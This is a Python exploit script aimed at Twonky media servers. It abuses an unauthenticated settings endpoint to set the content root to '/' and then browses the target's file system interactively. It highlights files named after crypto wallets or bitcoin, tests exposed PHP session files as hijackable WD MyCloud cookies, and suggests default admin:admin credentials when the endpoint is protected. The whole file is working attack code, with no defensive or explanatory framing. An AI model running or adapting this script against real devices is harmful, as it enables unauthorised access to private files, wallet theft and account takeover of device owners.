import urllib3
import sys
import socket
import requests
from colorama import init, Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Extend KEYWORDS, list if you want. This will highlight files and directory names that include a keyword.
KEYWORDS = ["CRYPTO", "CRIPTO", "BITCOIN", "WALLET"]
def keywordDetector(line):
        for keyword in KEYWORDS:
                if line.upper().find(keyword) != -1:
                        return True
        return False
def checkPort(host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
                s.connect((host,int(port)))
                s.settimeout(2)
                s.shutdown(2)
                return True
        except:
                return False

def setContentBase(host, port):
        payload = "\ncontentbase=/../\n"
        url = "http://{0}:{1}/rpc/set_all".format(host, port)
        try:
                response = requests.post(url, data=payload, timeout=5)
        except requests.exceptions.ReadTimeout:
                print (Fore.RED + "*** Timeout while setting contentbase path to '/' ***")
        except requests.exceptions.ChunkedEncodingError:
                print (Fore.RED + "*** 'contentbase' cannot be modified, password protection active ***")
                sys.exit()
        except requests.exceptions.ConnectionError:
                url = "https://{0}:{1}/rpc/set_all".format(host, port)
                response = requests.post(url, data=payload, timeout=5, verify=False)
        if response.status_code != 200:
                print (Fore.RED + "*** 'contentbase' cannot be modified, password protection active ***")
                print (Fore.YELLOW + "*** You should try to login with admin:admin (default creds) ***")
                sys.exit()
        else:
                print (Fore.MAGENTA + "*** 'contentbase' path set to '/'' ***")
                return True

def serverInfo(host, port):
        print (Fore.MAGENTA + "*** Get Serverdetails from Twonky ***")
        try:
                url = "http://{0}:{1}/rpc/get_friendlyname".format(host, port)
                friendlyname = requests.get(url, timeout=5)
        except requests.exceptions.ConnectionError:
                url= "https://{0}:{1}/rpc/get_friendlyname".format(host, port)
                friendlyname = requests.get(url, timeout=5, verify=False)
        if friendlyname.status_code == 200:
                print (Fore.GREEN + "Server Name: {0}".format(friendlyname.text))
        else:
                print (Fore.RED + "*** Not authorized to edit settings, password protection active ***")
                sys.exit()
        try:
                url = "http://{0}:{1}/rpc/info_status".format(host, port)
                infoStatus = requests.get(url, timeout=5)
        except requests.exceptions.ConnectionError:
                url = "https://{0}:{1}/rpc/info_status".format(host, port)
                infoStatus = requests.get(url, timeout=5, verify=False)
        for line in infoStatus.iter_lines():
                if line :
                        if line.find("version") != -1:
                                lineSplited = line.split("|")
                                versionNumber = lineSplited[1]
                                print (Fore.GREEN + "Twonky Version: {0}".format(versionNumber))
                        elif line.find("serverplatform") != -1:
                                lineSplited = line.split("|")
                                serverPlatform = lineSplited[1]
                                print (Fore.GREEN + "Serverplatform: {0}".format(serverPlatform))
                        elif line.find("builddate") != -1:
                                lineSplited = line.split("|")
                                buildDate = lineSplited[1]
                                print (Fore.GREEN + "Build date: {0}".format(buildDate))
                        elif line.find("pictures") != -1:
                                lineSplited = line.split("|")
                                pictureCount = lineSplited[1]
                                print (Fore.GREEN + "Pictures shared: {0}".format(pictureCount))
                        elif line.find("videos") != -1:
                                lineSplited = line.split("|")
                                videoCount = lineSplited[1]
                                print (Fore.GREEN + "Videos shared: {0}".format(videoCount))
        return versionNumber

def checkSessionCookie(host, cookieString):
        url = "http://{0}/api/2.1/rest/device_user".format(host)
        cookieTemp = cookieString.split("_")
        cookie = {'PHPSESSID': cookieTemp[1]}
        response = requests.get(url, timeout=10, cookies=cookie)
        if response.status_code == 200:
                return cookie
        else:
                return False

def browser(host, port, version):
        while True:
                var = raw_input("path nr: ")
                if var != "exit" :
                        if version[0] == "8":
                                url = "http://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
                        else:
                                url = "http://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
                        try:
                                response = requests.get(url, timeout=5)
                        except requests.exceptions.ConnectionError:
                                if version[0] == "8":
                                        url = "https://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
                                else:
                                        url = "https://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
                                response = requests.get(url, timeout=5, verify=False)
                        print "-" * 30
                        validCookieString = ""
                        for line in response.iter_lines():
                                if line :
                                        if len(line) > 3:
                                                if line[3] == "D":
                                                        line = line[:4].replace("D", " Dir ") + line[4:]
                                                        if keywordDetector(line[4:]):
                                                                print (Fore.RED + line)
                                                        else:
                                                                print (Fore.GREEN + line)
                                                elif line[3] == "F":
                                                        line = line[:4].replace("F", " Fil ") + line[4:]
                                                        if keywordDetector(line[4:]):
                                                                print (Fore.RED + line)
                                                        elif line[8:13] == "sess_":
                                                                print line
                                                                validCookie = checkSessionCookie(host, line[8:])
                                                                if validCookie != False:
                                                                        validCookieString = validCookie
                                                        else:
                                                                print line
                                                else:
                                                        print line
                        if len(validCookieString) >= 1:
                                print (Fore.RED + "Valid WDMyCloud cookie discovered: {0}".format(validCookieString))
                        print "-" * 30
                elif var == "exit":
                        sys.exit()

#*** Program start here ***
if __name__ == '__main__':
        if len(sys.argv) != 3:
                print "Usage: $ " + sys.argv[0] + " [IP_adress] [port]"
        else:
                host = sys.argv[1]
                print (Fore.MAGENTA + "https://www.shodan.io/host/{0}".format(host))
                port = sys.argv[2]
                if checkPort(host, port):
                        print (Fore.GREEN + "*** Port {0} opened ***".format(port))
                        twonky = raw_input("Run Twonky browser on port {0} [Y, N]? [Y] ".format(port))
                        if twonky.upper() != "N":
                                version = serverInfo(host, port)
                                if setContentBase(host, port):
                                        browser(host, port, version)